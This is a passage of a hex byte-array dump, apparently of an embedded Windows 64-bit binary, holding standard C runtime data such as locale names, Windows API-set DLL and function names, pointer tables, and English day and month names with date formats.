0x2d, 0x0, 0x43, 0x0, 0x4e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6b, 0x0, 0x6f, 0x0, 0x2d, 0x0, 0x4b, 0x0, 0x52, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7a, 0x0, 0x68, 0x0, 0x2d, 0x0, 0x54, 0x0, 0x57, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x80, 0x8, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc0, 0x8, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x9, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x50, 0x9, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb0, 0x9, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0xa, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x30, 0x2, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x40, 0xa, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x80, 0xa, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc0, 0xa, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0xb, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x50, 0xb, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb0, 0xb, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0xc, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x50, 0xc, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x70, 0x2, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x68, 0xc, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x80, 0xc, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc8, 0xc, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x64, 0x0, 0x61, 0x0, 0x74, 0x0, 0x65, 0x0, 0x74, 0x0, 0x69, 0x0, 0x6d, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x66, 0x0, 0x69, 0x0, 0x6c, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x32, 0x0, 0x2d, 0x0, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x6f, 0x0, 0x63, 0x0, 0x61, 0x0, 0x6c, 0x0, 0x69, 0x0, 0x7a, 0x0, 0x61, 0x0, 0x74, 0x0, 0x69, 0x0, 0x6f, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x32, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x6f, 0x0, 0x63, 0x0, 0x61, 0x0, 0x6c, 0x0, 0x69, 0x0, 0x7a, 0x0, 0x61, 0x0, 0x74, 0x0, 0x69, 0x0, 0x6f, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6f, 0x0, 0x62, 0x0, 0x73, 0x0, 0x6f, 0x0, 0x6c, 0x0, 0x65, 0x0, 0x74, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x32, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x70, 0x0, 0x72, 0x0, 0x6f, 0x0, 0x63, 0x0, 0x65, 0x0, 0x73, 0x0, 0x73, 0x0, 0x74, 0x0, 0x68, 0x0, 0x72, 0x0, 0x65, 0x0, 0x61, 0x0, 0x64, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x74, 0x0, 0x72, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x67, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x79, 0x0, 0x73, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x66, 0x0, 0x6f, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x32, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x72, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x78, 0x0, 0x73, 0x0, 0x74, 0x0, 0x61, 0x0, 0x74, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x32, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x72, 0x0, 0x74, 0x0, 0x63, 0x0, 0x6f, 0x0, 0x72, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x74, 0x0, 0x75, 0x0, 0x73, 0x0, 0x65, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x64, 0x0, 0x6f, 0x0, 0x77, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x65, 0x0, 0x63, 0x0, 0x75, 0x0, 0x72, 0x0, 0x69, 0x0, 0x74, 0x0, 0x79, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x79, 0x0, 0x73, 0x0, 0x74, 0x0, 0x65, 0x0, 0x6d, 0x0, 0x66, 0x0, 0x75, 0x0, 0x6e, 0x0, 0x63, 0x0, 0x74, 0x0, 0x69, 0x0, 0x6f, 0x0, 0x6e, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x78, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x74, 0x0, 0x75, 0x0, 0x73, 0x0, 0x65, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x64, 0x0, 0x69, 0x0, 0x61, 0x0, 0x6c, 0x0, 0x6f, 0x0, 0x67, 0x0, 0x62, 0x0, 0x6f, 0x0, 0x78, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x78, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6e, 0x0, 0x74, 0x0, 0x75, 0x0, 0x73, 0x0, 0x65, 0x0, 0x72, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x64, 0x0, 0x6f, 0x0, 0x77, 0x0, 0x73, 0x0, 0x74, 0x0, 0x61, 0x0, 0x74, 0x0, 0x69, 0x0, 0x6f, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x64, 0x0, 0x76, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x33, 0x0, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6e, 0x0, 0x74, 0x0, 0x64, 0x0, 0x6c, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0x0, 0x70, 0x0, 0x69, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x77, 0x0, 0x69, 0x0, 0x6e, 0x0, 0x2d, 0x0, 0x61, 0x0, 0x70, 0x0, 0x70, 0x0, 0x6d, 0x0, 0x6f, 0x0, 0x64, 0x0, 0x65, 0x0, 0x6c, 0x0, 0x2d, 0x0, 0x72, 0x0, 0x75, 0x0, 0x6e, 0x0, 0x74, 0x0, 0x69, 0x0, 0x6d, 0x0, 0x65, 0x0, 0x2d, 0x0, 0x6c, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x31, 0x0, 0x2d, 0x0, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x75, 0x0, 0x73, 0x0, 0x65, 0x0, 0x72, 0x0, 0x33, 0x0, 0x32, 0x0, 0x0, 0x0, 0x0, 0x0, 0x65, 0x0, 0x78, 0x0, 0x74, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x73, 0x0, 0x2d, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x72, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x41, 0x70, 0x69, 0x73, 0x41, 0x4e, 0x53, 0x49, 0x0, 0x6, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x4c, 0x43, 0x4d, 0x61, 0x70, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x45, 0x78, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0xf, 0x0, 0x0, 0x0, 0x4c, 0x6f, 0x63, 0x61, 0x6c, 0x65, 0x4e, 0x61, 0x6d, 0x65, 0x54, 0x6f, 0x4c, 0x43, 0x49, 0x44, 0x0, 0x0, 0x0, 0x0, 0x11, 0x0, 0x0, 0x0, 0x41, 0x70, 0x70, 0x50, 0x6f, 0x6c, 0x69, 0x63, 0x79, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x54, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x4d, 0x65, 0x74, 0x68, 0x6f, 0x64, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x30, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x34, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x38, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x3c, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x40, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x44, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x48, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4c, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x54, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x60, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x68, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x78, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x84, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x90, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x9c, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa4, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa8, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xac, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb0, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb4, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xbc, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc0, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc4, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc8, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd0, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd8, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe4, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xec, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xac, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf4, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xfc, 0x10, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x4, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x10, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x28, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x38, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x44, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x48, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x50, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x60, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x78, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x88, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x90, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x98, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa8, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb0, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc0, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd0, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe0, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf0, 0x11, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x8, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x30, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x48, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x50, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x58, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x60, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x68, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x70, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x78, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x80, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x88, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x90, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x98, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa8, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd0, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe0, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x68, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf0, 0x12, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x10, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x20, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x38, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x48, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x60, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x74, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x7c, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x88, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xa0, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc8, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xe0, 0x13, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x53, 0x75, 0x6e, 0x0, 0x4d, 0x6f, 0x6e, 0x0, 0x54, 0x75, 0x65, 0x0, 0x57, 0x65, 0x64, 0x0, 0x54, 0x68, 0x75, 0x0, 0x46, 0x72, 0x69, 0x0, 0x53, 0x61, 0x74, 0x0, 0x53, 0x75, 0x6e, 0x64, 0x61, 0x79, 0x0, 0x0, 0x4d, 0x6f, 0x6e, 0x64, 0x61, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x54, 0x75, 0x65, 0x73, 0x64, 0x61, 0x79, 0x0, 0x57, 0x65, 0x64, 0x6e, 0x65, 0x73, 0x64, 0x61, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x54, 0x68, 0x75, 0x72, 0x73, 0x64, 0x61, 0x79, 0x0, 0x0, 0x0, 0x0, 0x46, 0x72, 0x69, 0x64, 0x61, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x53, 0x61, 0x74, 0x75, 0x72, 0x64, 0x61, 0x79, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x61, 0x6e, 0x0, 0x46, 0x65, 0x62, 0x0, 0x4d, 0x61, 0x72, 0x0, 0x41, 0x70, 0x72, 0x0, 0x4d, 0x61, 0x79, 0x0, 0x4a, 0x75, 0x6e, 0x0, 0x4a, 0x75, 0x6c, 0x0, 0x41, 0x75, 0x67, 0x0, 0x53, 0x65, 0x70, 0x0, 0x4f, 0x63, 0x74, 0x0, 0x4e, 0x6f, 0x76, 0x0, 0x44, 0x65, 0x63, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x61, 0x6e, 0x75, 0x61, 0x72, 0x79, 0x0, 0x46, 0x65, 0x62, 0x72, 0x75, 0x61, 0x72, 0x79, 0x0, 0x0, 0x0, 0x0, 0x4d, 0x61, 0x72, 0x63, 0x68, 0x0, 0x0, 0x0, 0x41, 0x70, 0x72, 0x69, 0x6c, 0x0, 0x0, 0x0, 0x4a, 0x75, 0x6e, 0x65, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x75, 0x6c, 0x79, 0x0, 0x0, 0x0, 0x0, 0x41, 0x75, 0x67, 0x75, 0x73, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x53, 0x65, 0x70, 0x74, 0x65, 0x6d, 0x62, 0x65, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4f, 0x63, 0x74, 0x6f, 0x62, 0x65, 0x72, 0x0, 0x4e, 0x6f, 0x76, 0x65, 0x6d, 0x62, 0x65, 0x72, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x44, 0x65, 0x63, 0x65, 0x6d, 0x62, 0x65, 0x72, 0x0, 0x0, 0x0, 0x0, 0x41, 0x4d, 0x0, 0x0, 0x50, 0x4d, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4d, 0x4d, 0x2f, 0x64, 0x64, 0x2f, 0x79, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x64, 0x64, 0x64, 0x64, 0x2c, 0x20, 0x4d, 0x4d, 0x4d, 0x4d, 0x20, 0x64, 0x64, 0x2c, 0x20, 0x79, 0x79, 0x79, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x48, 0x3a, 0x6d, 0x6d, 0x3a, 0x73, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x53, 0x0, 0x75, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x4d, 0x0, 0x6f, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x54, 0x0, 0x75, 0x0, 0x65, 0x0, 0x0, 0x0, 0x57, 0x0, 0x65, 0x0, 0x64, 0x0, 0x0, 0x0, 0x54, 0x0, 0x68, 0x0, 0x75, 0x0, 0x0, 0x0, 0x46, 0x0, 0x72, 0x0, 0x69, 0x0, 0x0, 0x0, 0x53, 0x0, 0x61, 0x0, 0x74, 0x0, 0x0, 0x0, 0x53, 0x0, 0x75, 0x0, 0x6e, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4d, 0x0, 0x6f, 0x0, 0x6e, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x54, 0x0, 0x75, 0x0, 0x65, 0x0, 0x73, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x57, 0x0, 0x65, 0x0, 0x64, 0x0, 0x6e, 0x0, 0x65, 0x0, 0x73, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x54, 0x0, 0x68, 0x0, 0x75, 0x0, 0x72, 0x0, 0x73, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x46, 0x0, 0x72, 0x0, 0x69, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x53, 0x0, 0x61, 0x0, 0x74, 0x0, 0x75, 0x0, 0x72, 0x0, 0x64, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x61, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x46, 0x0, 0x65, 0x0, 0x62, 0x0, 0x0, 0x0, 0x4d, 0x0, 0x61, 0x0, 0x72, 0x0, 0x0, 0x0, 0x41, 0x0, 0x70, 0x0, 0x72, 0x0, 0x0, 0x0, 0x4d, 0x0, 0x61, 0x0, 0x79, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x75, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x75, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x41, 0x0, 0x75, 0x0, 0x67, 0x0, 0x0, 0x0, 0x53, 0x0, 0x65, 0x0, 0x70, 0x0, 0x0, 0x0, 0x4f, 0x0, 0x63, 0x0, 0x74, 0x0, 0x0, 0x0, 0x4e, 0x0, 0x6f, 0x0, 0x76, 0x0, 0x0, 0x0, 0x44, 0x0, 0x65, 0x0, 0x63, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x61, 0x0, 0x6e, 0x0, 0x75, 0x0, 0x61, 0x0, 0x72, 0x0, 0x79, 0x0, 0x0, 0x0, 0x46, 0x0, 0x65, 0x0, 0x62, 0x0, 0x72, 0x0, 0x75, 0x0, 0x61, 0x0, 0x72, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4d, 0x0, 0x61, 0x0, 0x72, 0x0, 0x63, 0x0, 0x68, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x70, 0x0, 0x72, 0x0, 0x69, 0x0, 0x6c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x75, 0x0, 0x6e, 0x0, 0x65, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4a, 0x0, 0x75, 0x0, 0x6c, 0x0, 0x79, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0x0, 0x75, 0x0, 0x67, 0x0, 0x75, 0x0, 0x73, 0x0, 0x74, 0x0, 0x0, 0x0, 